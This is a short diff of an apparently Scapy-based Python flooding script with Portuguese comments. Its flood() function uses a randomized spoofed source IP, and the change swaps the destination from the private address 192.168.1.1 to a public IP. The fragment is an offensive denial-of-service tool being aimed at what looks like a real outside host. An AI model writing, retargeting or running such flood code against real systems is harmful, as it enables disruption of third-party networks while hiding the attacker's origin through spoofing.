@@ -3,7 +3,7 @@ import threading
 def flood():
         # Define o endereço IP de origem e destino
         src_ip = RandIP()
-        dst_ip = '192.168.1.1'
+        dst_ip = '177.220.177.161'
 
         # Define o número de porta de origem e destino
         src_port = 1234
